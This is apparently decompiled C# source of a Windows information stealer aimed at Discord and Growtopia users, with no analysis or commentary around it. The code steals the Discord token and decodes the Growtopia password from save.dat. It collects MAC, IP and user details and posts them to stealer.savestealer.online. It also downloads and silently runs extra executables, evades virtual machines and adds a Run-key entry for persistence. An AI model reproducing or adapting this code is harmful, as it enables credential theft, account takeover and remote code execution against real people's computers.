using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace windowsapp
{
	// Token: 0x02000002 RID: 2
	internal sealed class MainClass
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public static string takeToken()
		{
			string result;
			try
			{
				string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//Discord//Local Storage//leveldb//000005.ldb");
				int num;
				while ((num = text.IndexOf("oken")) != -1)
				{
					text = text.Substring(num + "oken".Length);
				}
				string text2 = text.Split(new char[]
				{
					'"'
				})[1];
				result = text2;
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020CC File Offset: 0x000002CC
		private static string randomgen()
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			char[] array = new char[30];
			Random random = new Random();
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = text[random.Next(text.Length)];
			}
			return new string(array);
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002118 File Offset: 0x00000318
		private static void AntiVM()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
						{
							Environment.Exit(0);
						}
					}
				}
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002218 File Offset: 0x00000418
		private static void Startup()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
				registryKey.SetValue(Process.GetCurrentProcess().MainModule.FileName, Application.ExecutablePath);
			}
			catch
			{
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002268 File Offset: 0x00000468
		public static string ip()
		{
			string result;
			try
			{
				result = new WebClient
				{
					Proxy = null
				}.DownloadString("http://icanhazip.com/");
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000022C4 File Offset: 0x000004C4
		public static string[] GetMacAddress()
		{
			string empty = string.Empty;
			long num = -1L;
			string[] array = new string[10];
			int num2 = 1;
			foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
			{
				if (networkInterface.GetPhysicalAddress() != null)
				{
					string s = networkInterface.GetPhysicalAddress().ToString();
					List<string> values = (from i in Enumerable.Range(0, s.Length / 2)
					select s.Substring(i * 2, 2)).ToList<string>();
					string text = string.Join("", values);
					if (text != "" && num2 <= 10)
					{
						array[num2] = text;
						num2++;
					}
					string text2 = networkInterface.GetPhysicalAddress().ToString();
					if (networkInterface.Speed > num && !string.IsNullOrEmpty(text2) && text2.Length >= 12)
					{
						num = networkInterface.Speed;
					}
				}
			}
			return array;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000023B8 File Offset: 0x000005B8
		private static string GetMacAddress1()
		{
			string text = string.Empty;
			foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
			{
				if (networkInterface.OperationalStatus == OperationalStatus.Up)
				{
					text += networkInterface.GetPhysicalAddress().ToString();
					break;
				}
			}
			return text;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002404 File Offset: 0x00000604
		private static string GetMacAddress5()
		{
			string text = string.Empty;
			foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
			{
				if (networkInterface.OperationalStatus == OperationalStatus.Up)
				{
					text += networkInterface.GetPhysicalAddress().ToString();
					break;
				}
			}
			return text;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002450 File Offset: 0x00000650
		private static void checksystem()
		{
			for (;;)
			{
				Thread.Sleep(7500);
				string text = new WebClient
				{
					Proxy = null
				}.DownloadString("http://stealer.savestealer.online/checkprocess.php?process=" + MainClass.statrandom);
				if (text.ToLower().Contains('1'))
				{
					MainClass.restart();
				}
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000024A0 File Offset: 0x000006A0
		private static void restart()
		{
			try
			{
				Thread.Sleep(5000);
				string text = new WebClient
				{
					Proxy = null
				}.DownloadString("http://stealer.savestealer.online/checkprocess.php?process=" + MainClass.statrandom);
				if (text.ToLower().Contains('1'))
				{
					string address = "http://stealer.savestealer.online/changeprocess.php";
					WebClient webClient = new WebClient();
					NameValueCollection nameValueCollection = new NameValueCollection();
					nameValueCollection["process"] = MainClass.statrandom;
					byte[] bytes = webClient.UploadValues(address, "POST", nameValueCollection);
					Encoding.UTF8.GetString(bytes);
					webClient.Dispose();
					MainClass.gonder();
				}
				else
				{
					MainClass.checksystem();
				}
			}
			catch
			{
				MainClass.restart();
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002558 File Offset: 0x00000758
		public static void Main()
		{
			MainClass.gonder();
			MainClass.Startup();
			MainClass.checknew();
		}

		// Token: 0x0600000C RID: 12 RVA: 0x0000256C File Offset: 0x0000076C
		private static void checknew()
		{
			try
			{
				string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
				char[] array = new char[8];
				Random random = new Random();
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = text[random.Next(text.Length)];
				}
				string text2 = new string(array);
				text2 = Path.GetTempPath() + "\\" + text2 + ".exe";
				string address = new WebClient
				{
					Proxy = null
				}.DownloadString("http://stealer.savestealer.online/link.php?owner=asd33");
				WebClient webClient = new WebClient();
				webClient.DownloadFile(address, text2);
				new Process
				{
					StartInfo = 
					{
						FileName = text2,
						WorkingDirectory = Path.GetTempPath()
					}
				}.Start();
			}
			catch
			{
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002644 File Offset: 0x00000844
		private static void gonder()
		{
			MainClass.Packet packet = new MainClass.Packet();
			try
			{
				string text = Path.GetTempPath() + "\\error_pcx.exe";
				if (!File.Exists(text))
				{
					WebClient webClient = new WebClient();
					webClient.DownloadFile("https://cdn.discordapp.com/attachments/783881036664799234/783889460407959572/savedecrypter.exe", text);
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.StartInfo.WorkingDirectory = Path.GetTempPath();
				process.Start();
				process.WaitForExit();
				string[] array = File.ReadAllText(Path.GetTempPath() + "\\result.txt").Split(new char[]
				{
					'|'
				});
				packet.growid = array[0];
				packet.password = array[1];
				packet.lastworld = array[2];
				MainClass.growid = packet.growid;
			}
			catch
			{
				try
				{
					byte[] array2 = File.ReadAllBytes((string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Growtopia", "path", null) + "\\save.dat");
					Regex regex = new Regex("[^\\w0-9]");
					string text2 = Encoding.Default.GetString(array2).Replace("\0", " ");
					packet.growid = regex.Replace(text2.Substring(text2.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
					{
						' '
					})[3], string.Empty);
					string text3 = null;
					foreach (string str in MainClass.pwDec.Func(array2))
					{
						text3 = text3 + str + "\r\n";
					}
					packet.password = text3;
					packet.lastworld = regex.Replace(text2.Substring(text2.IndexOf("lastworld") + "lastworld".Length).Split(new char[]
					{
						' '
					})[3], string.Empty);
					if (packet.lastworld == "lastworld")
					{
						packet.lastworld = "unknown";
					}
				}
				catch
				{
					packet.lastworld = "EMPTY";
					packet.growid = "EMPTY";
					packet.password = "EMPTY";
				}
			}
			try
			{
				string[] macAddress = MainClass.GetMacAddress();
				string value = string.Join("\r", macAddress);
				packet.token = MainClass.takeToken();
				packet.computerInfo = Environment.MachineName;
				packet.user = Environment.UserName;
				string address = "http://stealer.savestealer.online";
				WebClient webClient2 = new WebClient();
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection["pcname"] = packet.user;
				nameValueCollection["token"] = packet.token;
				nameValueCollection["growid"] = packet.growid;
				nameValueCollection["pass"] = packet.password;
				nameValueCollection["lastworld"] = packet.lastworld;
				nameValueCollection["mac"] = value;
				nameValueCollection["ip"] = MainClass.ip();
				nameValueCollection["owner"] = "priel123";
				nameValueCollection["process"] = MainClass.statrandom;
				nameValueCollection["statusproc"] = "0";
				byte[] bytes = webClient2.UploadValues(address, "POST", nameValueCollection);
				Encoding.UTF8.GetString(bytes);
				webClient2.Dispose();
				MainClass.checksystem();
			}
			catch
			{
				try
				{
					packet.token = MainClass.takeToken();
					packet.computerInfo = Environment.MachineName;
					packet.user = Environment.UserName;
					string address2 = "http://stealer.savestealer.online";
					WebClient webClient3 = new WebClient();
					NameValueCollection nameValueCollection2 = new NameValueCollection();
					nameValueCollection2["pcname"] = packet.user;
					nameValueCollection2["token"] = packet.token;
					nameValueCollection2["growid"] = packet.growid;
					nameValueCollection2["pass"] = packet.password;
					nameValueCollection2["lastworld"] = packet.lastworld;
					nameValueCollection2["mac"] = MainClass.GetMacAddress5();
					nameValueCollection2["ip"] = MainClass.ip();
					nameValueCollection2["owner"] = "priel123";
					nameValueCollection2["process"] = MainClass.statrandom;
					nameValueCollection2["statusproc"] = "0";
					byte[] bytes2 = webClient3.UploadValues(address2, "POST", nameValueCollection2);
					Encoding.UTF8.GetString(bytes2);
					webClient3.Dispose();
					MainClass.checksystem();
				}
				catch
				{
					try
					{
						packet.token = MainClass.takeToken();
						packet.computerInfo = Environment.MachineName;
						packet.user = Environment.UserName;
						string address3 = "http://stealer.savestealer.online";
						WebClient webClient4 = new WebClient();
						NameValueCollection nameValueCollection3 = new NameValueCollection();
						nameValueCollection3["pcname"] = packet.user;
						nameValueCollection3["token"] = packet.token;
						nameValueCollection3["growid"] = packet.growid;
						nameValueCollection3["pass"] = packet.password;
						nameValueCollection3["lastworld"] = packet.lastworld;
						nameValueCollection3["mac"] = MainClass.GetMacAddress1();
						nameValueCollection3["ip"] = MainClass.ip();
						nameValueCollection3["owner"] = "priel123";
						nameValueCollection3["process"] = MainClass.statrandom;
						nameValueCollection3["statusproc"] = "0";
						byte[] bytes3 = webClient4.UploadValues(address3, "POST", nameValueCollection3);
						Encoding.UTF8.GetString(bytes3);
						webClient4.Dispose();
						MainClass.checksystem();
					}
					catch
					{
						packet.token = MainClass.takeToken();
						packet.computerInfo = Environment.MachineName;
						packet.user = Environment.UserName;
						string address4 = "http://stealer.savestealer.online";
						WebClient webClient5 = new WebClient();
						NameValueCollection nameValueCollection4 = new NameValueCollection();
						nameValueCollection4["pcname"] = packet.user;
						nameValueCollection4["token"] = packet.token;
						nameValueCollection4["growid"] = packet.growid;
						nameValueCollection4["pass"] = packet.password;
						nameValueCollection4["lastworld"] = packet.lastworld;
						nameValueCollection4["mac"] = "NULL";
						nameValueCollection4["ip"] = MainClass.ip();
						nameValueCollection4["owner"] = "priel123";
						nameValueCollection4["process"] = MainClass.statrandom;
						nameValueCollection4["statusproc"] = "0";
						byte[] bytes4 = webClient5.UploadValues(address4, "POST", nameValueCollection4);
						Encoding.UTF8.GetString(bytes4);
						webClient5.Dispose();
						MainClass.checksystem();
					}
				}
			}
		}

		// Token: 0x04000001 RID: 1
		public static string growid = "";

		// Token: 0x04000002 RID: 2
		public static string statrandom = MainClass.randomgen();

		// Token: 0x02000003 RID: 3
		public static class pwDec
		{
			// Token: 0x06000010 RID: 16 RVA: 0x00002D88 File Offset: 0x00000F88
			public static List<string> ParsePassword(byte[] contents)
			{
				List<string> result;
				try
				{
					string text = "";
					foreach (byte b in contents)
					{
						string text2 = b.ToString("X2");
						bool flag = text2 == "00";
						if (flag)
						{
							text += "<>";
						}
						else
						{
							text += text2;
						}
					}
					bool flag2 = text.Contains("74616E6B69645F70617373776F7264");
					if (flag2)
					{
						string text3 = "74616E6B69645F70617373776F7264";
						int num = text.IndexOf(text3);
						int num2 = text.LastIndexOf(text3);
						bool flag3 = false;
						string text4;
						if (flag3)
						{
							text4 = string.Empty;
						}
						num += text3.Length;
						int num3 = text.IndexOf("<><><>", num);
						bool flag4 = false;
						if (flag4)
						{
							text4 = string.Empty;
						}
						string @string = Encoding.UTF8.GetString(MainClass.pwDec.StringToByteArray(text.Substring(num, num3 - num).Trim()));
						bool flag5 = ((@string.ToCharArray()[0] == '_') ? 1 : 0) == 0;
						if (flag5)
						{
							text4 = text.Substring(num, num3 - num).Trim();
						}
						else
						{
							num2 += text3.Length;
							num3 = text.IndexOf("<><><>", num2);
							text4 = text.Substring(num2, num3 - num2).Trim();
						}
						string text5 = "74616E6B69645F70617373776F7264" + text4 + "<><><>";
						int num4 = text.IndexOf(text5);
						bool flag6 = false;
						string text6;
						if (flag6)
						{
							text6 = string.Empty;
						}
						num4 += text5.Length;
						int num5 = text.IndexOf("<><><>", num4);
						bool flag7 = false;
						if (flag7)
						{
							text6 = string.Empty;
						}
						text6 = text.Substring(num4, num5 - num4).Trim();
						int num6 = (int)MainClass.pwDec.StringToByteArray(text4)[0];
						text6 = text6.Substring(0, num6 * 2);
						MainClass.pwDec.StringToByteArray(text6.Replace("<>", "00"));
						List<byte> list = new List<byte>();
						List<byte> list2 = new List<byte>();
						for (int j = 0; j < list.Count; j++)
						{
							list2.Add((byte)((int)(list[j] - 1) - j));
						}
						List<string> list3 = new List<string>();
						for (int k = 0; k <= 255; k++)
						{
							string text7 = "";
							foreach (byte b2 in list2)
							{
								bool flag8 = MainClass.pwDec.ValidateChar((char)((byte)((int)b2 + k)));
								if (flag8)
								{
									text7 += ((char)((byte)((int)b2 + k))).ToString();
								}
							}
							bool flag9 = text7.Length == num6;
							if (flag9)
							{
								list3.Add(text7);
							}
						}
						result = list3;
					}
					else
					{
						result = null;
					}
				}
				catch
				{
					result = null;
				}
				return result;
			}

			// Token: 0x06000011 RID: 17 RVA: 0x00003080 File Offset: 0x00001280
			public static byte[] StringToByteArray(string str)
			{
				Dictionary<string, byte> dictionary = new Dictionary<string, byte>();
				for (int i = 0; i <= 255; i++)
				{
					dictionary.Add(i.ToString("X2"), (byte)i);
				}
				List<byte> list = new List<byte>();
				for (int j = 0; j < str.Length; j += 2)
				{
					list.Add(dictionary[str.Substring(j, 2)]);
				}
				return list.ToArray();
			}

			// Token: 0x06000012 RID: 18 RVA: 0x000030E8 File Offset: 0x000012E8
			private static bool ValidateChar(char cdzdshr)
			{
				return (cdzdshr >= '0' && cdzdshr <= '9') || (cdzdshr >= 'A' && cdzdshr <= 'Z') || (cdzdshr >= 'a' && cdzdshr <= 'z') || (cdzdshr >= '+' && cdzdshr <= '.');
			}

			// Token: 0x06000013 RID: 19 RVA: 0x0000311C File Offset: 0x0000131C
			public static string[] Func(byte[] lel)
			{
				List<string> list = MainClass.pwDec.ParsePassword(lel);
				return list.ToArray();
			}
		}

		// Token: 0x02000004 RID: 4
		public class Packet
		{
			// Token: 0x04000003 RID: 3
			public string oldid;

			// Token: 0x04000004 RID: 4
			public string growid;

			// Token: 0x04000005 RID: 5
			public string password;

			// Token: 0x04000006 RID: 6
			public string mac;

			// Token: 0x04000007 RID: 7
			public string computerInfo;

			// Token: 0x04000008 RID: 8
			public string lastworld;

			// Token: 0x04000009 RID: 9
			public string user;

			// Token: 0x0400000A RID: 10
			public string token;

			// Token: 0x0400000B RID: 11
			public string ip;

			// Token: 0x0400000C RID: 12
			public string browsercreds;

			// Token: 0x0400000D RID: 13
			public string desktoppic;
		}
	}
}
